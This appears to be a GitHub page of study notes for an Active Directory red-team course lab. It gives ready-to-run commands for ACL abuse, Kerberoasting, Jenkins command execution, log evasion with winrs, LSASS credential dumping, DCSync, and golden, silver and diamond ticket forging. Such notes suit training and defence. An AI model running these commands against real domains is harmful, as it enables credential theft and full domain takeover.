## Summary

- Domain Enumeration - Trusts
- Domain Enumeration - User Hunting
- Privile Escalations
- ACL (Access Control List)
- DACL abuse
- Targeted Kerberoasting
- Abuse - Jenkins
- NTLM relaying
- GPO Abuse
- DCSync
- Golden Ticket
- Silver Ticket
- Dimond Ticket

### Domain Enumeration - Trusts

In an AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.

### One-way trust

One-way trust - Unidirectional. Users in the trusted domain can access resources in the trusting domain but the reverse is not true

<img width="1064" height="419" alt="image" src="https://github.com/user-attachments/assets/3af9659b-0072-42b1-9407-bc80ec462bc3" />


### Two-way trust

Two-way trust - Bi-directional. Users of both domains can access resources in the other domain.

<img width="1167" height="444" alt="image" src="https://github.com/user-attachments/assets/68a37835-1a13-4840-9b4e-5d2cf01464b5" />


### Transitivity

**Transitive** - Can be extended to establish trust relationships with other domains.
- All the default intra-forest trust relationships (Tree-root, Parent-Child) between domains within a same forest are transitive two-way trusts

**Nontransitive** - Cannot be extended to other domains in the forest. Can be two-way or one-way.
- This is the default trust (called external trust) between two domains in different forests when forests do not have a trust relationship.

<img width="651" height="572" alt="image" src="https://github.com/user-attachments/assets/30d3c431-8382-46a1-ba63-559af0094ca1" />


**Parent-child trust**

It is created automatically between the new domain and the domain that precedes it in the namespace hierarchy, whenever a new domain is added in a tree. 

* Ex: dollarcorp.moneycorp.local is a child of moneycorp.local

This trust is always two-way transitive.

**Tree-root trust**

It is created automatically between whenever a new domain tree is added to a forest root.

This trust is always two-way transitive

<img width="1228" height="647" alt="image" src="https://github.com/user-attachments/assets/131b3361-e7d2-4a5b-abcf-21bc175fd308" />


**External Trust**

Between two domains in different forests when forests do not have a trust relationship.
- Can be one-way or two-way and is nontransitive.

<img width="987" height="558" alt="image" src="https://github.com/user-attachments/assets/7dc6b88b-a3f2-4e58-b96d-f064cb0b6da3" />


**Forest Trust**

* Between forest root domain.

* Cannot be extended to a third forest (no implicit trust).

* Can be one-way or two-way transitive.

<img width="1094" height="363" alt="image" src="https://github.com/user-attachments/assets/bb3f5c5f-0deb-4c49-a455-2643aa5eefff" />

Get a list of all domain trusts for the current domain
* Get-DomainTrust
* Get-DomainTrust -Domain us.dollarcorp.moneycorp.local

Get details about the current forest
* Get-Forest
* Get-Forest -Forest eurocorp.local

Get all domains in the current forest
* Get-ForestDomain
* Get-ForestDomain -Forest eurocorp.local (Get-ADForest).Domains

Get all global catalogs for the current forest
* Get-ForestGlobalCatalog
* Get-ForestGlobalCatalog -Forest eurocorp.local

Map trusts of a forest (no Forest trusts in the lab)
* Get-ForestTrust
* Get-ForestTrust -Forest eurocorp.local


### Domain Enumeration - User Hunting

Find all machines on the current domain where the current user has local admin access
* Find-LocalAdminAccess -Verbose

This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine.
This can also be done with the help of remote administration tools like WMI and PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.

* See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1

<img width="1240" height="820" alt="image" src="https://github.com/user-attachments/assets/3f656553-1504-4c27-a86e-73303403fc3a" />


**Find computers where a domain admin (or specified user/group) has sessions**
* Find-DomainUserLocation -Verbose
* Find-DomainUserLocation -UserGroupIdentity "RDPUsers"

**Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess)**
* Find-DomainUserLocation -CheckAccess

**Find computers (File Servers and Distributed File servers) where a domain admin session is available**
* Find-DomainUserLocation -Stealth

**List sessions on remote machines** (https://github.com/Leo4j/Invoke-SessionHunter)
* Invoke-SessionHunter -FailSafe

Above command doesn’t need admin access on remote machines. Uses Remote Registry and queries HKEY_USERS hive.

An opsec friendly command would be (avoid connecting to all the target machines by specifying targets)
* Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt AlteredSecurity


### Privilege Escalation
There are various ways of locally escalating privileges on Windows box:
- Missing patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and more
- Kerberos and NTLM Relaying

We can use below tools for complete coverage
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Privesc: https://github.com/itm4n/PrivescCheck
- winPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

**Services Issues using PowerUp**

**Get services with unquoted paths and a space in their name**
* Get-ServiceUnquoted -Verbose

**Get services where the current user can write to its binary path or change arguments to the binary**
* Get-ModifiableServiceFile -Verbose

**Get the services whose configuration current user can modify.**
* Get-ModifiableService -Verbose

**Run all checks from PowerUp**
* Invoke-AllChecks

**Privesc**
* Invoke-PrivEscCheck

**PEASS-ng**
* winPEASx64.exe
### Access Control List (ACL)

Enables control on the ability of a process to access objects and other resources in active directory based on:
– Access Tokens (security context of a process - identity and privs of user)
– Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL))

### Access Control Entries (ACE) 
It is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits access. Who has permission and what can be done on an object?
• Two types:
– DACL - Defines the permissions trustees (a user or group) have on an object.
– SACL - Logs success and failure audit messages when an object is accessed

An Access Control Entry (ACE) is an individual rule within an ACL that defines specific permissions granted or denied to a user or group.

* Each ACE includes:
- The Security Principal (user, group, or computer to which permissions apply).
- The Access Mask (specific permissions such as read, write, delete, etc.).
- The Access Type (Allow or Deny).

Example: Understanding ACEs
An ACE might specify that:
- User Alice has Full Control over an Organizational Unit (OU).
- Group HelpDesk has Read and Write permissions to modify certain user attributes.
- User Bob is explicitly denied the ability to delete an object.

### Managing ACLs and ACEs in Active Directory
Administrators can modify ACLs and ACEs using graphical tools like Active Directory Users and Computers (ADUC) or command-line tools like PowerShell.

Modifying ACLs Using PowerShell
To add an ACE granting a user full control over an object:
```
$acl = Get-Acl "AD:CN=JohnDoe,OU=Users,DC=example,DC=com"
$identity = New-Object System.Security.Principal.NTAccount("example.com\Alice")
$permission = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $permission, "Allow")
$acl.AddAccessRule($accessRule)
Set-Acl -Path "AD:CN=JohnDoe,OU=Users,DC=example,DC=com" -AclObject $acl
```
This script grants Alice full control over the user JohnDoe.


<img width="5808" height="4584" alt="ACL_Mindmap" src="https://github.com/user-attachments/assets/3e33fe34-2940-4f07-b472-372ee0d25a66" />


### Commands 

**Get the ACLs associated with the specified object**
* Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs

**Get the ACLs associated with the specified prefix to be used for search**
* Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose

**Get the ACLs associated for Domain Admins**
* Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

**Analyze Trust Relationships (Displays trust relationships between domains)**
* Get-NetDomainTrust

**Check ACLs on AD Objects  (Shows ACLs for a specific user account, resolving GUIDs to human-readable names)**
* Get-ObjectAcl -SamAccountName "Administrator" -ResolveGUIDs

**Search for interesting ACEs**
* Find-InterestingDomainAcl -ResolveGUIDs

**Get ACLs where studentx has interesting permissions**
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student867"}

**Get the ACLs associated with the specified path**
* Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"

### DACL abuse

DACLs (Active Directory Discretionary Access Control Lists) are lists made of ACEs (Access Control Entries) that identify the users and groups that are allowed or denied access on an object. 

SACLs (Systems Access Control Lists) define the audit and monitoring rules over a securable object.

When misconfigured, ACEs can be abused to operate lateral movement or privilege escalation within an AD domain.

### Permisssions index

1. WriteDacl: Edit the object's DACL (i.e. "inbound" permissions).
2. GenericAll: Combination of almost all other rights.
3. GenericWrite: Combination of write permissions (Self, WriteProperty) among other things.
4. WriteProperty: Edit one of the object's attributes. The attribute is referenced by an "ObjectType GUID".
5. WriteOwner: Assume the ownership of the object (i.e. new owner of the victim = attacker, cannot be set to another user).With the "SeRestorePrivilege" right it is possible to specify an arbitrary owner.
6. Self: Perform "Validated writes" (i.e. edit an attribute's value and have that value verified and validate by AD). The "Validated writes" is referenced by an "ObjectType GUID".
7. AllExtendedRights: Peform "Extended rights". "AllExtendedRights" refers to that permission being unrestricted. This right can be restricted by specifying the extended right in the "ObjectType GUID".
8. User-Force-Change-Password: Change the password of the object without having to know the previous one.
9. DS-Replication-Get-Changes: One of the two extended rights needed to operate a DCSync.
10. DS-Replication-Get-Changes-All: One of the two extended rights needed to operate a DCSync.
11. Self-Membership: Edit the "member" attribute of the object.
12. Validated-SPN: Edit the "servicePrincipalName" attribute of the object.


### AddMember
This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, Self, AllExtendedRights or Self-Membership, over the target group.
The attacker can add a user/group/computer to a group.

**Windows**
* net group 'Domain Admins' 'user' /add /domain

Powershell: Active Directory module
* Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'

Powershell: PowerSploit module
* Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'


**Linux**

With net and cleartext credentials (will be prompted)
* net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"

With net and cleartext credentials
* net rpc group addmem "$TargetGroup" "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"

### ForceChangePassword
This abuse can be carried out when controlling an object that has a GenericAll, AllExtendedRights or User-Force-Change-Password over the target user.

### Targeted Kerberoasting
This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, WriteProperty or Validated-SPN over the target. A member of the Account Operator group usually has those permissions.

The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting. This technique is called Targeted Kerberoasting.

**Windows**
1. Make sur that the target account has no SPN
- Get-DomainUser 'victimuser' | Select serviceprincipalname

2. Set the SPN
- Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

3. Obtain a kerberoast hash
- $User = Get-DomainUser 'victimuser'
- $User | Get-DomainSPNTicket | fl

4. Clear the SPNs of the target account
- $User | Select serviceprincipalname
- Set-DomainObject -Identity victimuser -Clear serviceprincipalname

### Grant rights
This abuse can be carried out when controlling an object that has WriteDacl over another object.

The attacker can write a new ACE to the target object’s DACL (Discretionary Access Control List). This can give the attacker full control of the target object.

Instead of giving full control, the same process can be applied to allow an object to DCSync by adding two ACEs with specific Extended Rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All). Giving full control leads to the same thing since GenericAll includes all ExtendedRights, hence the two extended rights needed for DCSync to work.

**Windows**

1. Give full control
- Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"

2. Give DCSync (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All)
- Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object"

### Grant ownership
This has the following command-line arguments.This abuse can be carried out when controlling an object that has WriteOwner or GenericAll over any object.

The attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. For instance, the attacker could change the target object's permissions and grant rights.

**Windows**
* Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'

## Privilege Escalation - Feature Abuse - Jenkins

Apart from numerous plugins, there are two ways of executing commands on a Jenkins Master.

* If you have Admin access (default installation before 2.x), go to 
```
http://<jenkins_server>/script
```

* In the script console, Groovy scripts could be executed.
```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter:
```
powershell -c <command>
```

## Privilege Escalation - Relaying

In a relaying attack, the target credentials are not captured. I
nstead, they are forwarded to a local or remote service or an endpoint for authentication. Two types based on authentication:
* NTLM relaying
* Kerberos relaying

LDAP and AD CS are the two most abused services for relaying.

## Privilege Escalation - GPO Abuse
* A GPO with overly permissive ACL can be abused for multiple attacks. 
* Recall the ACL abuse diagram.

GPOddity combines NTLM relaying and modification of Group Policy Container. 
* By relaying credentials of a user who has WriteDACL on GPO, we can modify the path (gPCFileSysPath) of the group policy template (default is SYSVOL).
* This enables loading of a malicious template from a location that we control.

<img width="1394" height="669" alt="image" src="https://github.com/user-attachments/assets/acb3df37-0059-4e8c-96ba-9bd70df1e3f5" />

## Lateral Movement - PowerShell Remoting

Think of PowerShell Remoting (PSRemoting) as psexec on steroids but much more silent and super fast!
* PSRemoting uses Windows Remote Management (WinRM) which is Microsoft's implementation of WS-Management. 
* Enabled by default on Server 2012 onwards with a firewall exception. 
* Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS).
* It is the recommended way to manage Windows Core servers.
* The remoting process runs as a high integrity process. That is, you get an elevated shell.

PowerShell remoting supports the system-wide transcripts and deep script block logging. 
* We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
```
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```

### Lateral Movement - Credential Extraction

Local Security Authority (LSA) is responsible for authentication on a Windows machine. 
Local Security Authority Subsystem Service (LSASS) is its service. 

LSASS stores credentials in multiple forms - NT hash, AES, Kerberos tickets and so on. Credentials are stored by LSASS when a user:
* Logs on to a local session or RDP
* Uses RunAs
* Run a Windows service
* Runs a scheduled task or batch job
* Uses a Remote Administration tool

The LSASS process is therefore a very attractive target. It is also the most monitored process on a Windows machine. 
Some of the credentials that can be extracted without touching LSASS
* SAM hive (Registry) - Local credentials
* LSA Secrets/SECURITY hive (Registry) - Service account passwords, 

Domain cached credentials etc.
* DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc

### Lateral Movement - Mimikatz
mimikatz can be used to extract credentials, tickets, replay credentials, play with AD security and many more interesting attacks!

Dump credentials on a using Mimikatz.
```
mimikatz.exe -Command '"sekurlsa::ekeys"' 
```
Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
```
SafetyKatz.exe "sekurlsa::ekeys" 
```
From a Linux attacking machine using impacket. 

### Lateral Movement - Credential Extraction - LSASS

Dump credentials on a using Mimikatz.
```
mimikatz.exe -Command '"sekurlsa::ekeys"'
```

Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
 ```
SafetyKatz.exe "sekurlsa::ekeys"
```

### Lateral Movement - OverPass-The-Hash

Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
```
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```

Over Pass the hash (OPTH) generate tokens from hashes or keys

 * Below doesn't need elevation
 ```
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```
* Below command needs elevation
```
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Lateral Movement - DCSync
**Theory**
DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. 
This attack can lead to the compromise of major credential material such as the Kerberos krbtgt keys used legitimately for tickets creation, but also for tickets forging by attackers. The consequences of this attack are similar to an NTDS.dit dump and parsing but the practical aspect differ.

* To extract credentials from the DC without code execution on it, we can use DCSync. 
* To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for dcorp domain

```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
> [!IMPORTANT]
> By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to run DCSync

### About Kerberos
* Kerberos is the basis of authentication in a Windows Active Directory environment. 
* Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain 
controller. These tickets represent the client's credentials.! Therefore, Kerberos is understandably a very interesting target of abuse!

<img width="1133" height="632" alt="image" src="https://github.com/user-attachments/assets/3119572b-dc44-467f-9608-d9170883f1d4" />

### Persistence - Golden Ticket

A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
* The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
* As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.

<img width="1312" height="679" alt="image" src="https://github.com/user-attachments/assets/860fbdda-68ac-4f64-8bd3-00005d468c0b" />

Execute mimikatz (or a variant) on DC as DA to get krbtgt hash
```
C:\AD\Tools\SafetyKatz.exe '"lsadump::lsa /patch"'
```
To use the DCSync feature for getting AES keys for krbtgt account. Use the below command with DA privileges (or a user that has replication rights on the domain object):
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

Using the DCSync option needs no code execution on the target DC.

Use Rubeus to forge a Golden ticket with attributes similar to a normal TGT:
```
C:\AD\Tools\Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

Above command generates the ticket forging command. Note that 3 LDAP queries are sent to the DC to retrieve the values
1. To retrieve flags for user specified in /user. 
2. To retrieve /groups, /pgid, /minpassage and /maxpassage
3. To retrieve /netbios of the current domain
If you have already enumerated the above values, manually specify as many you can in the forging command (a bit more opsec friendly)

The Golden ticket forging command looks like this:
```
C:\AD\Tools\Rubeus.exe golden 
/aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848
/user:Administrator /id:500 /pgid:513 
/domain:dollarcorp.moneycorp.local
/sid:S-1-5-21-719815819-3726368948-3917688648
/pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 
/logoncount:2453
/netbios:dcorp
/groups:544,512,520,513
/dc:DCORP-DC.dollarcorp.moneycorp.local
/uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

<img width="1195" height="533" alt="image" src="https://github.com/user-attachments/assets/8cabefb2-e6fe-4e33-bb46-2f8daddbbf88" />
<img width="1156" height="428" alt="image" src="https://github.com/user-attachments/assets/bbd54335-ba90-4c85-b45d-f35481e72c32" />

### Persistence - Silver Ticket

A valid Service Ticket or TGS ticket (Golden ticket is TGT). Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
* Services rarely check PAC (Privileged Attribute Certificate).
* Services will allow access only to the services themselves.
* 
* Reasonable persistence period (default 30 days for computer accounts).

<img width="1255" height="653" alt="image" src="https://github.com/user-attachments/assets/0298eebb-969f-4458-a8f2-8671fbe80584" />

Forge a Silver ticket:
```
C:\AD\Tools\Rubeus.exe silver
/service:http/dcorp-dc.dollarcorp.moneycorp.local
/rc4:6e58e06e07588123319fe02feeab775d 
/sid:S-1-5-21-719815819-3726368948-3917688648
/ldap
/user:Administrator
/domain:dollarcorp.moneycorp.local
/ptt
```

Just like the Golden ticket, /ldap option queries DC for information related to the user.
Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more

### Persistence - Diamond Ticket
A diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account. 
Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack. 

Once again, the persistence lifetime depends on krbtgt account. A diamond ticket is more opsec safe as it has:
* Valid ticket times because a TGT issued by the DC is modified
* In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged

<img width="1562" height="825" alt="image" src="https://github.com/user-attachments/assets/e677d974-161e-48d8-847c-cc5d525d2671" />

We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used 
too):
```
Rubeus.exe diamond
/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
/user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator
/domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local
/ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show
/ptt
```

We could also use /tgtdeleg option in place of credentials in case we have 
access as a domain user:
```
Rubeus.exe diamond
/krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg
/enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local
/dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512
/createnetonly:C:\Windows\System32\cmd.exe
/show /ptt
``` 
